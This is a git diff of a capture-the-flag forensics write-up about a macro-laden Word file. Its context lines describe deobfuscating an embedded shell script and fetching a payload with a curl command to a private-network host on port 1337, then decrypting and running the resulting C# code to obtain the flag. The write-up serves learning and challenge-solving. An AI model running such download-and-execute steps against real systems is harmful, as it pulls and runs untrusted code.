@@ -18,7 +18,7 @@ https://github.com/7h4nd5RG0d/Forensics/blob/main/Steganography/freeflag(WORD)--
 6)Identating the shell script we get it as: 
 ![image](https://github.com/7h4nd5RG0d/Forensics/assets/128285431/1a251011-df52-4797-9594-36de8c0d3e73)  
 7) We can get the required file by : **curl http://192.168.56.1:1337/d9d9dec9d5d2**  
-8) After that following the decryption we get the C# code.
+8) After that following the decryption we get the C# code.  
 9) Running the C# code on https://dotnetfiddle.net/ we get the flag.  
 ## Something new:  
 1) Images may contain alternate text for helping visually impaired images which comes under macros.
